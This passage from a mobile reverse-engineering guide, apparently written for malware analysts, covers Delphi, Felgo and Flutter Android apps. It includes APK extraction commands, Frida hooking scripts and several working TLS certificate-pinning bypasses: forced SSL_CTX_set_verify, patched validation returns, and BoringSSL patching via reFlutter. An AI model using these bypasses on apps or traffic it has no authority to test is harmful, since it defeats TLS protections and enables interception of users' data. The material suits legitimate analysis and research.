<code>System.</code>, <code>Vcl.</code>, <code>Fmx.</code>, <code>IdHTTP</code> String literals in the native binary (Delphi unit names) <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -iE \"(libFMX|embarcadero)\"\n</code></pre> <p>Secondary check via strings in the native library:</p> <pre><code>strings lib/arm64-v8a/libFMXNativeActivity.so | grep -iE \"(System\\.|Fmx\\.|embarcadero|TId)\"\n</code></pre>"},{"location":"reversing/frameworks/delphi/#code-location","title":"Code Location","text":""},{"location":"reversing/frameworks/delphi/#single-native-binary","title":"Single Native Binary","text":"<p>The entire application is in one <code>.so</code> file. Unlike frameworks that split logic across multiple libraries or script files, Delphi compiles everything -- application code, RTL, FireMonkey, and third-party libraries -- into a single monolithic binary.</p> <pre><code>unzip target.apk \"lib/arm64-v8a/*\" -d extracted/\nls -lh extracted/lib/arm64-v8a/\n</code></pre> <p>Expect a large file (typically 10-50 MB or more) because the Delphi RTL and FireMonkey framework are statically linked.</p>"},{"location":"reversing/frameworks/delphi/#rtti-in-the-binary","title":"RTTI in the Binary","text":"<p>Delphi embeds extensive Runtime Type Information (RTTI) in compiled binaries. This is one of the most valuable features for reverse engineering -- RTTI structures contain:</p> <ul> <li>Class names (fully qualified with unit prefix, e.g., <code>Unit1.TForm1</code>)</li> <li>Method names (published methods)</li> <li>Property names, types, and accessor methods</li> <li>Virtual method tables with readable names</li> <li>Form resource data (DFM serialized as binary)</li> </ul> <p>This metadata survives compilation and is present in release builds unless explicitly stripped (which is rare in practice).</p>"},{"location":"reversing/frameworks/delphi/#analysis-tools-workflow","title":"Analysis Tools &amp; Workflow","text":"Tool Purpose Ghidra Primary disassembler -- load the <code>.so</code> and recover RTTI structures IDA Pro Commercial disassembler with ARM decompiler IDR (Interactive Delphi Reconstructor) Parses Delphi RTTI from executables -- primarily x86/Windows but RTTI format knowledge transfers Delphi RTTI Ghidra Scripts Ghidra scripts to parse Delphi RTTI structures from ARM binaries jadx Decompile Java shell (minimal but shows manifest and entry points) Frida Runtime hooking of native functions"},{"location":"reversing/frameworks/delphi/#recommended-workflow","title":"Recommended Workflow","text":"<ol> <li>Unzip APK and confirm Delphi via <code>libFMXNativeActivity.so</code> or <code>com.embarcadero.*</code> classes</li> <li>Extract the native <code>.so</code> from <code>lib/&lt;arch&gt;/</code></li> <li>Run strings extraction to identify Delphi unit names, class names, and API endpoints</li> <li>Load into Ghidra and apply Delphi RTTI parsing scripts to recover class hierarchies</li> <li>Locate key classes by searching RTTI strings for network-related (<code>TIdHTTP</code>, <code>TNetHTTPClient</code>), crypto (<code>TCipher</code>, <code>THash</code>), or form names (<code>TLoginForm</code>, <code>TMainForm</code>)</li> <li>Map virtual method tables -- Delphi VMTs have a predictable layout with class name pointer, instance size, and method pointers</li> <li>Hook at runtime with Frida to intercept function calls, network traffic, and data processing</li> </ol>"},{"location":"reversing/frameworks/delphi/#rtti-recovery-in-ghidra","title":"RTTI Recovery in Ghidra","text":"<p>Delphi VMT structures follow a documented layout. The class name is stored as a ShortString (length-prefixed Pascal string) at a known offset from the VMT pointer:</p> <pre><code>strings libFMXNativeActivity.so | grep -E \"^(T[A-Z][a-zA-Z]+|Unit[0-9]|Fmx\\.|System\\.)\"\n</code></pre> <p>Look for patterns like <code>TForm1</code>, <code>TMainForm</code>, <code>TDataModule1</code> -- these indicate developer-created classes. Cross-reference these names in Ghidra with the surrounding code to find business logic entry points.</p>"},{"location":"reversing/frameworks/delphi/#dfm-form-resources","title":"DFM Form Resources","text":"<p>Delphi forms are serialized as DFM (Delphi Form Module) resources, often embedded in the binary. DFM data contains the complete UI layout: component names, properties, event handler assignments, and nested component hierarchies. Search for DFM signatures (<code>TPF0</code> for binary DFM format) in the <code>.so</code>:</p> <pre><code>strings -e l libFMXNativeActivity.so | grep \"TPF0\"\n</code></pre>"},{"location":"reversing/frameworks/delphi/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/delphi/#network-interception","title":"Network Interception","text":"<p>Delphi apps commonly use Indy (<code>TIdHTTP</code>) or <code>TNetHTTPClient</code> for networking. These are compiled into the native binary, so hooks target the native <code>.so</code>:</p> <pre><code>var libApp = Process.findModuleByName(\"libFMXNativeActivity.so\");\nif (libApp) {\n    libApp.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"TIdHTTP\") !== -1 &amp;&amp; exp.name.indexOf(\"DoRequest\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[Delphi HTTP] DoRequest called\");\n                    console.log(Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(\"\\n\"));\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/delphi/#symbol-enumeration","title":"Symbol Enumeration","text":"<p>Delphi binaries often export or contain symbols with mangled Object Pascal names. Enumerate them to find targets:</p> <pre><code>var libApp = Process.findModuleByName(\"libFMXNativeActivity.so\");\nif (libApp) {\n    libApp.enumerateExports().forEach(function(exp) {\n        if (exp.type === \"function\") {\n            console.log(\"[Export] \" + exp.name + \" @ \" + exp.address);\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/delphi/#function-tracing","title":"Function Tracing","text":"<p>For tracing specific Delphi class methods, use pattern-based hooking on mangled names:</p> <pre><code>var libApp = Process.findModuleByName(\"libFMXNativeActivity.so\");\nif (libApp) {\n    libApp.enumerateSymbols().forEach(function(sym) {\n        if (sym.name.indexOf(\"TMainForm\") !== -1 || sym.name.indexOf(\"TLoginForm\") !== -1) {\n            Interceptor.attach(sym.address, {\n                onEnter: function(args) {\n                    console.log(\"[Delphi] \" + sym.name + \" called\");\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/delphi/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Delphi apps implement SSL/TLS through Indy's <code>TIdSSLIOHandlerSocketOpenSSL</code> or the newer <code>TNetHTTPClient</code> with <code>THTTPSecureProtocol</code>. Both ultimately use OpenSSL (bundled or system).</p>"},{"location":"reversing/frameworks/delphi/#indy-ssl-handler-hook","title":"Indy SSL Handler Hook","text":"<pre><code>var libApp = Process.findModuleByName(\"libFMXNativeActivity.so\");\nif (libApp) {\n    libApp.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"TIdSSLIOHandler\") !== -1 &amp;&amp; exp.name.indexOf(\"Verify\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[SSL] TIdSSLIOHandler verify intercepted\");\n                },\n                onLeave: function(retval) {\n                    retval.replace(ptr(1));\n                    console.log(\"[SSL] Forced verify to return true\");\n                }\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/delphi/#openssl-direct-bypass","title":"OpenSSL Direct Bypass","text":"<p>Since Delphi bundles OpenSSL, target the verification callback directly:</p> <pre><code>var libssl = Process.findModuleByName(\"libssl.so\");\nif (libssl) {\n    var setVerify = libssl.findExportByName(\"SSL_CTX_set_verify\");\n    if (setVerify) {\n        Interceptor.attach(setVerify, {\n            onEnter: function(args) {\n                args[1] = ptr(0);\n                args[2] = ptr(0);\n                console.log(\"[SSL] SSL_CTX_set_verify forced to SSL_VERIFY_NONE\");\n            }\n        });\n    }\n}\n</code></pre>"},{"location":"reversing/frameworks/delphi/#tnethttpclient-certificate-validation","title":"TNetHTTPClient Certificate Validation","text":"<p>For apps using the newer <code>TNetHTTPClient</code>, the <code>OnValidateServerCertificate</code> event controls pinning. Hook the validation callback:</p> <pre><code>var libApp = Process.findModuleByName(\"libFMXNativeActivity.so\");\nif (libApp) {\n    libApp.enumerateSymbols().forEach(function(sym) {\n        if (sym.name.indexOf(\"ValidateServerCertificate\") !== -1 || sym.name.indexOf(\"OnValidateCert\") !== -1) {\n            Interceptor.attach(sym.address, {\n                onEnter: function(args) {\n                    console.log(\"[SSL] Certificate validation callback intercepted\");\n                },\n                onLeave: function(retval) {\n                    retval.replace(ptr(1));\n                }\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/delphi/#obfuscation-anti-analysis","title":"Obfuscation &amp; Anti-Analysis","text":"<p>Delphi Android apps rarely employ advanced obfuscation. The ecosystem lacks mature obfuscation tooling comparable to Java/Kotlin or JavaScript frameworks. RTTI preservation means class/method/property names are readable in release builds, developers rarely strip symbols, DFM form resources expose UI structure, and few commercial protectors target Delphi ARM binaries. Some developers apply generic ARM binary protectors or use app-level protectors from the Packers ecosystem, but these are uncommon.</p>"},{"location":"reversing/frameworks/delphi/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Compiled native ARM (Object Pascal via LLVM) Readability Low for code, high for metadata (RTTI, DFM) String extraction Excellent -- RTTI preserves class/method/property names Control flow recovery Standard native RE, aided by RTTI-based function identification Patching Binary patching of the <code>.so</code> Obfuscation ceiling Low -- limited tooling for Delphi ARM obfuscation Overall difficulty Moderate-Hard (rank 10/28) <p>The rich RTTI metadata in Delphi binaries is a double-edged sword for developers -- it significantly aids reverse engineering by providing a readable map of the application's class structure, method names, and properties. The main challenge is the size of the monolithic binary and the need for ARM native analysis skills. Once RTTI is parsed, locating and understanding specific functionality becomes substantially easier than with a typical stripped C/C++ binary.</p>"},{"location":"reversing/frameworks/delphi/#references","title":"References","text":"<ul> <li>Embarcadero RAD Studio Documentation</li> <li>FireMonkey Overview</li> <li>Delphi RTTI Documentation</li> <li>IDR -- Interactive Delphi Reconstructor</li> <li>Delphi RTTI Parser for Ghidra</li> <li>Ghidra</li> <li>Frida -- Dynamic Instrumentation</li> <li>Indy Project (Internet Direct)</li> </ul>"},{"location":"reversing/frameworks/felgo/","title":"Felgo","text":"<p>Felgo is a cross-platform SDK built on top of Qt, using QML (Qt Modeling Language) as its primary scripting layer and C++ for performance-critical native code. Originally launched as \"V-Play\" for game development, it rebranded to Felgo and expanded into general app development. Felgo apps ship Qt's core native libraries alongside Felgo-specific libraries and bundle QML scripts inside Qt Resource Container (<code>.rcc</code>) files. The reverse engineering approach splits between extracting and reading QML scripts from resource files and analyzing compiled C++/Qt native libraries with disassemblers.</p>"},{"location":"reversing/frameworks/felgo/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/felgo/#component-stack","title":"Component Stack","text":"Layer Component QML Scripts Application logic, UI definitions, game mechanics written in QML/JavaScript Felgo SDK Game engine components (scenes, entities, physics), app components (navigation, theming) Qt Framework Core platform abstraction -- networking, file I/O, rendering, event loop Native C++ Custom C++ modules, Qt plugin implementations, performance-critical code Android Shell Thin Java wrapper using <code>org.qtproject.qt5.android.QtActivity</code> or Felgo's custom activity"},{"location":"reversing/frameworks/felgo/#qml-engine","title":"QML Engine","text":"<p>QML is a declarative language with inline JavaScript support. Felgo apps define their UI and logic in <code>.qml</code> files that are interpreted by Qt's QML engine at runtime. The QML engine (<code>libQt5Qml*.so</code>) parses and executes these scripts, resolving property bindings and signal-slot connections dynamically.</p> <p>QML files can contain embedded JavaScript blocks for imperative logic:</p> <pre><code>import Felgo 4.0\nimport QtQuick 2.0\n\nApp {\n    onInitTheme: {\n        var endpoint = \"https://api.example.com/v1/auth\"\n        HttpRequest.get(endpoint).then(function(res) {\n            storage.setValue(\"token\", res.body.token)\n        })\n    }\n}\n</code></pre> <p>This means API endpoints, authentication logic, and business rules are often visible in extracted QML files.</p>"},{"location":"reversing/frameworks/felgo/#rendering-pipeline","title":"Rendering Pipeline","text":"<p>Felgo uses Qt's scene graph for rendering, which runs on a dedicated render thread using OpenGL ES or Vulkan. Game apps use Felgo's entity-component system built on top of the scene graph. This architecture means UI and game logic live in QML, while the rendering pipeline is handled entirely in native code.</p>"},{"location":"reversing/frameworks/felgo/#identification","title":"Identification","text":"Indicator Location <code>libQt5Core*.so</code> Qt core library in <code>lib/</code> <code>libQt5Qml*.so</code> QML engine library <code>libQt5Quick*.so</code> Qt Quick rendering library <code>libFelgo*.so</code> Felgo SDK library <code>assets/*.rcc</code> Qt Resource Container files holding QML scripts and assets <code>net.vplay.*</code> Legacy V-Play package prefix in DEX/manifest <code>com.felgo.*</code> Current Felgo package prefix <code>org.qtproject.qt5.*</code> Qt Android integration classes <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -iE \"(libQt5|libFelgo|\\.rcc|felgo|vplay)\"\n</code></pre>"},{"location":"reversing/frameworks/felgo/#distinguishing-felgo-from-plain-qt","title":"Distinguishing Felgo from Plain Qt","text":"<p>Both Felgo and plain Qt apps contain <code>libQt5Core*.so</code> and <code>.rcc</code> files. The presence of <code>libFelgo*.so</code> or Felgo-specific package names (<code>com.felgo.*</code>, <code>net.vplay.*</code>) distinguishes Felgo apps from generic Qt applications.</p> <pre><code>unzip -l target.apk | grep -i felgo\n</code></pre> <p>If no Felgo-specific libraries are found but Qt libraries are present, the app is a plain Qt application (covered in the Qt for Android page).</p>"},{"location":"reversing/frameworks/felgo/#code-location-extraction","title":"Code Location &amp; Extraction","text":""},{"location":"reversing/frameworks/felgo/#qt-resource-container-rcc-files","title":"Qt Resource Container (.rcc) Files","text":"<p>QML scripts, JavaScript files, images, and other assets are bundled into <code>.rcc</code> files -- Qt's binary resource archive format. These files are the primary reverse engineering target.</p> <p>Extract <code>.rcc</code> files from the APK, then decompile them with Qt's <code>rcc</code> tool:</p> <pre><code>unzip target.apk \"assets/*.rcc\" -d extracted/\nrcc --reverse --output extracted/rcc_out/ extracted/assets/qml_resources.rcc\n</code></pre> <p>The <code>.rcc</code> format starts with a <code>qres</code> magic header (bytes <code>71 72 65 73</code>), followed by a tree of resource entries. If <code>rcc</code> is unavailable, the Python package <code>qtrcc</code> provides equivalent extraction.</p>"},{"location":"reversing/frameworks/felgo/#extracted-qml-analysis","title":"Extracted QML Analysis","text":"<p>After extraction, the QML files are plaintext and fully readable:</p> <pre><code>find extracted/rcc_out/ -name \"*.qml\" -o -name \"*.js\"\n</code></pre> <p>Search for high-value targets in extracted QML/JS:</p> <pre><code>grep -rniE \"(http|api|token|password|secret|encrypt|key)\" extracted/rcc_out/\n</code></pre>"},{"location":"reversing/frameworks/felgo/#compiled-qml-cache","title":"Compiled QML Cache","text":"<p>Some Qt apps pre-compile QML to bytecode (<code>.qmlc</code> / <code>.jsc</code> files) for faster startup. These are cached compilations of QML files and contain Qt's internal bytecode format.</p> <p>The bytecode is version-specific to the Qt release. Tools for decompiling <code>.qmlc</code> are limited, but the string table within the bytecode still contains readable identifiers and literals:</p> <pre><code>strings extracted/rcc_out/*.qmlc | grep -iE \"(http|api|token|key)\"\n</code></pre>"},{"location":"reversing/frameworks/felgo/#native-libraries","title":"Native Libraries","text":"<p>C++ logic compiles into shared libraries. The primary targets:</p> Library Contents <code>libFelgo*.so</code> Felgo SDK -- game engine, app components, networking <code>libQt5Core*.so</code> Qt core runtime <code>libQt5Network*.so</code> Qt networking stack (HTTP, SSL, sockets) App-specific <code>.so</code> Custom C++ modules registered as QML types <p>Analyze with Ghidra or IDA. Qt's signal-slot mechanism uses string-based method lookups via <code>qt_metacall</code>, which preserves method name strings in the binary.</p>"},{"location":"reversing/frameworks/felgo/#analysis-workflow","title":"Analysis Workflow","text":"<ol> <li>Unzip APK and confirm Felgo indicators (<code>libFelgo*.so</code>, <code>.rcc</code> files)</li> <li>Extract <code>.rcc</code> files using <code>rcc --reverse</code> or Python tooling</li> <li>Read QML files -- these contain UI definitions, business logic, API calls</li> <li>Search QML/JS for endpoints, credentials, encryption keys, storage operations</li> <li>Map Felgo/Qt API usage (<code>HttpRequest</code>, <code>Storage</code>, <code>WebSocket</code>, <code>FileUtils</code>)</li> <li>Analyze native <code>.so</code> files in Ghidra for C++ logic not exposed in QML</li> <li>Hook at runtime with Frida targeting Qt and Felgo native functions</li> </ol>"},{"location":"reversing/frameworks/felgo/#key-felgo-apis-to-search-for","title":"Key Felgo APIs to Search For","text":"API Purpose <code>HttpRequest</code> HTTP client -- reveals endpoints <code>WebSocket</code> Persistent connections -- potential C2 channel <code>Storage</code> Key-value persistence -- stored credentials <code>FileUtils</code> File system operations -- data exfiltration paths <code>NativeUtils</code> Platform-specific native calls <code>GameNetwork</code> Felgo multiplayer backend communication <code>Firebase</code> Push notifications, analytics"},{"location":"reversing/frameworks/felgo/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/felgo/#native-library-hooks","title":"Native Library Hooks","text":"<p>Frida hooks on Qt and Felgo native libraries:</p> <pre><code>var qtNetwork = Process.findModuleByName(\"libQt5Network.so\");\nif (qtNetwork) {\n    qtNetwork.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"QNetworkAccessManager\") !== -1 &amp;&amp; exp.name.indexOf(\"createRequest\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[Qt Network] createRequest called\");\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/felgo/#qml-engine-interception","title":"QML Engine Interception","text":"<p>Hook the QML engine to intercept script evaluation:</p> <pre><code>var qtQml = Process.findModuleByName(\"libQt5Qml.so\");\nif (qtQml) {\n    qtQml.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"evaluate\") !== -1 &amp;&amp; exp.type === \"function\") {\n            console.log(\"[QML] \" + exp.name + \" @ \" + exp.address);\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/felgo/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Felgo/Qt apps use <code>QSslSocket</code> for TLS, which links against OpenSSL or BoringSSL compiled into <code>libQt5Network*.so</code>. Standard Java-layer bypasses do not work because Qt manages its own TLS stack.</p> <p>Hook the native SSL verification:</p> <pre><code>var sslLib = Process.findModuleByName(\"libssl.so\");\nif (sslLib) {\n    var SSL_CTX_set_verify = sslLib.findExportByName(\"SSL_CTX_set_verify\");\n    if (SSL_CTX_set_verify) {\n        Interceptor.attach(SSL_CTX_set_verify, {\n            onEnter: function(args) {\n                args[1] = ptr(0);\n                args[2] = ptr(0);\n            }\n        });\n    }\n}\n</code></pre>"},{"location":"reversing/frameworks/felgo/#obfuscation","title":"Obfuscation","text":"<p>Pre-compiled QML (<code>.qmlc</code>) converts readable QML into Qt bytecode, providing a baseline level of obfuscation -- though string literals remain visible. C++ modules in <code>.so</code> files are stripped of debug symbols in release builds but retain signal/slot method names via Qt's <code>qt_metacall</code> mechanism. Felgo apps in the wild rarely apply additional obfuscation beyond release-mode compilation.</p>"},{"location":"reversing/frameworks/felgo/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect QML Layer C++ Native Layer Code format Plaintext QML/JavaScript Compiled ARM native Readability High after .rcc extraction Low -- standard native RE String extraction Trivial Moderate (Qt preserves some metadata) Control flow recovery Full Partial (Ghidra) Patching Edit QML, rebuild .rcc, repackage Binary patching in Ghidra Overall difficulty Easy (QML scripts) Hard (native C++) Combined ranking Moderate-Hard (rank 25/28) <p>The split between readable QML scripts and compiled C++ native code creates a two-tier analysis challenge. If the app's logic is primarily in QML (common for Felgo apps), reverse engineering is straightforward. If significant logic is pushed into C++ modules, difficulty increases substantially. The limited tooling ecosystem for Qt/QML mobile reverse engineering compared to other frameworks adds friction.</p>"},{"location":"reversing/frameworks/felgo/#references","title":"References","text":"<ul> <li>Felgo Documentation</li> <li>Qt Resource System Documentation</li> <li>Qt QML Engine Internals</li> <li>Ghidra</li> <li>Frida</li> <li>rcc Tool Documentation</li> </ul>"},{"location":"reversing/frameworks/flutter/","title":"Flutter","text":"<p>Flutter apps compile Dart source code ahead-of-time (AOT) into native ARM instructions, packaged as <code>libapp.so</code>. The standard Android reverse engineering pipeline -- jadx, apktool, smali -- produces nothing useful because the malicious logic never touches Dalvik bytecode. The entire app runs inside Flutter's custom engine (<code>libflutter.so</code>), which embeds the Dart VM, a Skia-based rendering engine, and BoringSSL for networking. Flutter is Google's open-source UI toolkit, and its AOT compilation model has made it increasingly attractive to malware authors seeking a \"free\" obfuscation layer.</p>"},{"location":"reversing/frameworks/flutter/#architecture","title":"Architecture","text":"<p>A release-mode Flutter APK contains three layers:</p> Layer Component Contents Java shell <code>io.flutter.embedding.*</code> Minimal bootstrap -- initializes the Flutter engine, nothing else Flutter engine <code>libflutter.so</code> Dart VM, Skia renderer, BoringSSL, text/input handling (~10-15 MB) App payload <code>libapp.so</code> AOT-compiled Dart code -- all business logic, UI, networking <p>The Java/Kotlin layer is a thin wrapper. Decompiling it with jadx reveals only Flutter engine initialization code. All meaningful analysis targets <code>libapp.so</code>.</p>"},{"location":"reversing/frameworks/flutter/#dart-aot-compilation","title":"Dart AOT Compilation","text":"<p>In release builds, the Dart compiler performs ahead-of-time compilation through this pipeline:</p> <pre><code>Dart source \u2192 Kernel IR \u2192 Dart AOT compiler \u2192 Native ARM instructions + Object Pool \u2192 libapp.so\n</code></pre> <p>The output is not a standard native shared library with exported symbols. Instead, <code>libapp.so</code> is an ELF file containing a Dart snapshot -- a serialized representation of compiled code and data designed to be loaded by the Dart VM at startup.</p>"},{"location":"reversing/frameworks/flutter/#libappso-elf-structure","title":"libapp.so ELF Structure","text":"<p><code>libapp.so</code> exports exactly four symbols:</p> Symbol Purpose <code>_kDartVmSnapshotData</code> VM-level type system metadata, core library structures <code>_kDartVmSnapshotInstructions</code> Compiled machine code for VM internals <code>_kDartIsolateSnapshotData</code> Application object pool -- strings, constants, class metadata <code>_kDartIsolateSnapshotInstructions</code> Compiled machine code for application Dart functions <p>The <code>SnapshotInstructions</code> sections contain native ARM64 code. The <code>SnapshotData</code> sections contain serialized Dart objects: strings, integer arrays, type descriptors, and references linking code to data.</p> <p>Pool Register Convention</p> <p>Dart AOT code accesses the object pool through a dedicated register. On ARM64, register <code>x27</code> holds the pool pointer (PP). On ARM32, it is <code>r5</code>. On x64, <code>r15</code>. Recognizing pool-relative loads is essential for resolving string references and constant values in Ghidra or IDA.</p>"},{"location":"reversing/frameworks/flutter/#snapshot-format","title":"Snapshot Format","text":"<p>The Dart snapshot uses a two-phase serialization model:</p> <ol> <li>Alloc phase -- allocates space for each serialized cluster (group of objects of the same type)</li> <li>Fill phase -- populates field values: string bytes, reference IDs, integer scalars</li> </ol> <p>The format is identified by a snapshot version string, generated by hashing the source code of snapshot-related files in the Dart SDK. This means the format changes whenever the serialization code changes -- not on a predictable schedule.</p> <p>No Random Access</p> <p>The snapshot must be parsed sequentially from the beginning. There is no index or offset table for individual classes. Locating a specific class requires walking every cluster before it. This is a deliberate design choice for serialization speed, not an anti-RE measure, but it has the same practical effect.</p>"},{"location":"reversing/frameworks/flutter/#identification","title":"Identification","text":"Indicator Location <code>libflutter.so</code> <code>lib/&lt;arch&gt;/libflutter.so</code> -- Flutter engine <code>libapp.so</code> <code>lib/&lt;arch&gt;/libapp.so</code> -- compiled Dart payload <code>flutter_assets/</code> <code>assets/flutter_assets/</code> -- fonts, images, asset manifests <code>kernel_blob.bin</code> <code>assets/flutter_assets/kernel_blob.bin</code> -- debug builds only (contains Dart kernel IR) <code>io.flutter.*</code> Package prefix in DEX (thin bootstrap only) <code>io.flutter.embedding.engine.FlutterEngine</code> Engine initialization class <pre><code>unzip -l target.apk | grep -E \"(libflutter|libapp|flutter_assets)\"\n</code></pre>"},{"location":"reversing/frameworks/flutter/#dart-sdk-version-detection","title":"Dart SDK Version Detection","text":"<p>The Dart SDK version determines the snapshot format and dictates which tools can parse it. Extract the version from <code>libflutter.so</code>:</p> <pre><code>strings lib/arm64-v8a/libflutter.so | grep -E \"^[0-9]+\\.[0-9]+\\.[0-9]+\"\n</code></pre> <p>This typically returns a version string like <code>3.3.10</code> or <code>3.5.4</code>. The flutter-versions repository maps Flutter versions to Dart SDK snapshot hashes and engine commits.</p>"},{"location":"reversing/frameworks/flutter/#code-location-extraction","title":"Code Location &amp; Extraction","text":""},{"location":"reversing/frameworks/flutter/#extracting-libappso","title":"Extracting libapp.so","text":"<pre><code>unzip target.apk lib/arm64-v8a/libapp.so -d extracted/\nunzip target.apk lib/arm64-v8a/libflutter.so -d extracted/\n</code></pre> <p>Both files are needed: <code>libflutter.so</code> for version detection and <code>libapp.so</code> for analysis.</p>"},{"location":"reversing/frameworks/flutter/#debug-builds","title":"Debug Builds","text":"<p>Debug builds include <code>kernel_blob.bin</code> in <code>assets/flutter_assets/</code>. This file contains the Dart Kernel IR (an intermediate representation) and can be decompiled back to near-source Dart using the Dart SDK's <code>gen_snapshot</code> tools. Debug builds are rare in production but occasionally appear in early-stage malware samples.</p>"},{"location":"reversing/frameworks/flutter/#analysis-tools-workflow","title":"Analysis Tools &amp; Workflow","text":"Tool Purpose Notes blutter Dart AOT snapshot analysis, symbol recovery, annotated disassembly ARM64 only, auto-detects Dart version reFlutter SSL bypass via patched <code>libflutter.so</code>, snapshot extraction Version-dependent patched engines darter Python snapshot parser, 100% data parsing Research tool, less practical output unflutter Static analyzer for AOT snapshots ELF parsing + cluster extraction Ghidra Native ARM64 disassembly of <code>libapp.so</code> Requires blutter output for symbol import IDA Pro Alternative native disassembler JEB Dart AOT plugin available JEB Dart AOT snapshot helper plugin Commercial, integrates snapshot metadata Frida Runtime hooking of Dart functions Hook at addresses from blutter output"},{"location":"reversing/frameworks/flutter/#blutter-workflow","title":"blutter Workflow","text":"<p>blutter is the primary tool for Flutter reverse engineering. It works by compiling a Dart AOT snapshot dumper against the exact Dart SDK version used to build the target app, then using the Dart VM's internal APIs to parse the snapshot.</p> <pre><code>git clone https://github.com/worawit/blutter.git\ncd blutter\npython3 blutter.py path/to/lib/arm64-v8a/\n</code></pre> <p>blutter automatically:</p> <ol> <li>Detects the Dart SDK version from <code>libflutter.so</code></li> <li>Downloads and compiles the matching Dart SDK (cached for reuse)</li> <li>Parses <code>libapp.so</code> using the Dart VM's own deserialization code</li> <li>Outputs annotated assembly with recovered symbols</li> </ol> <p>Output structure:</p> <pre><code>blutter_output/\n  \u251c\u2500\u2500 asm/              # Annotated ARM64 assembly per library\n  \u2502   \u251c\u2500\u2500 dart:core/\n  \u2502   \u251c\u2500\u2500 package:flutter/\n  \u2502   \u2514\u2500\u2500 package:app_name/\n  \u251c\u2500\u2500 pp.txt            # Object pool dump (strings, constants)\n  \u251c\u2500\u2500 objs.txt          # Serialized object listing\n  \u2514\u2500\u2500 blutter_frida.js  # Auto-generated Frida hook stubs\n</code></pre> <p>The <code>asm/</code> directory contains per-library disassembly with class names, method names, and pool references resolved. The <code>pp.txt</code> file dumps all object pool entries -- search it for API endpoints, encryption keys, and C2 URLs.</p> <p>Dart SDK Version Matching</p> <p>blutter must compile against the exact Dart SDK version. If the version detection fails (custom Flutter engine builds, stripped version strings), use <code>--dart-version X.X.X_android_arm64</code> to specify manually. The flutter-versions repository maps snapshot hashes to SDK versions.</p>"},{"location":"reversing/frameworks/flutter/#ghidra-integration","title":"Ghidra Integration","text":"<p>After running blutter, import the annotated data into Ghidra:</p> <ol> <li>Load <code>libapp.so</code> in Ghidra</li> <li>Apply blutter's output as labels/comments at function addresses</li> <li>Use the pool register (<code>x27</code> on ARM64) to trace string and constant references</li> <li>Cross-reference pool entries from <code>pp.txt</code> with Ghidra's disassembly</li> </ol> <p>The Phrack issue 71 article \"Reversing Dart AOT snapshots\" covers the snapshot format internals, pool register conventions, and analysis techniques in depth.</p>"},{"location":"reversing/frameworks/flutter/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Flutter does not use Android's Java-layer TLS stack. It bundles BoringSSL (Google's OpenSSL fork) directly into <code>libflutter.so</code>, meaning standard Java-layer Frida hooks (OkHttp, TrustManager) do not work.</p>"},{"location":"reversing/frameworks/flutter/#reflutter-method","title":"reFlutter Method","text":"<p>reFlutter provides pre-patched <code>libflutter.so</code> binaries with the certificate verification function neutralized:</p> <pre><code>pip install reflutter\nreflutter target.apk\n</code></pre> <p>reFlutter patches <code>ssl_crypto_x509_session_verify_cert_chain</code> in BoringSSL to always return <code>true</code>, then repackages the APK with the modified engine. The app accepts any certificate, allowing proxy interception.</p> <p>Version Matching Required</p> <p>reFlutter must have a pre-built patched engine matching the target's Flutter version. If the exact version is unavailable, the patched binary may crash or produce ABI mismatches. Check reFlutter releases for supported versions.</p>"},{"location":"reversing/frameworks/flutter/#frida-native-hook-method","title":"Frida Native Hook Method","text":"<p>When reFlutter lacks a matching version, hook the BoringSSL verification function directly in <code>libflutter.so</code>:</p> <pre><code>function findVerifyFunction() {\n    var dominated = Process.findModuleByName(\"libflutter.so\");\n    var pattern = \"FF 03 05 D1 FD 7B 0F A9 F4 4F 0E A9\";\n    var matches = Memory.scanSync(dominated.base, dominated.size, pattern);\n    if (matches.length &gt; 0) {\n        return matches[0].address;\n    }\n    return null;\n}\n\nvar verifyAddr = findVerifyFunction();\nif (verifyAddr) {\n    Interceptor.attach(verifyAddr, {\n        onLeave: function(retval) {\n            retval.replace(0x1);\n        }\n    });\n    console.log(\"[Flutter] SSL verification bypassed at \" + verifyAddr);\n}\n</code></pre> <p>The byte pattern targets the prologue of <code>ssl_crypto_x509_session_verify_cert_chain</code>. This pattern varies across Flutter engine versions -- the SensePost guide documents the approach for locating the function when patterns change.</p>"},{"location":"reversing/frameworks/flutter/#boringssl-binary-patching","title":"BoringSSL Binary Patching","text":"<p>Permanently patch <code>libflutter.so</code> in the APK:</p> <ol> <li>Open <code>libflutter.so</code> in Ghidra</li> <li>Search for the <code>ssl_crypto_x509_session_verify_cert_chain</code> function (look for x509 string references)</li> <li>Patch the return value to always be 1 (MOV W0, #1; RET)</li> <li>Save, repackage APK, re-sign</li> </ol> <p>This avoids runtime hooking entirely but requires re-signing the APK.</p>"},{"location":"reversing/frameworks/flutter/#hooking-strategy","title":"Hooking 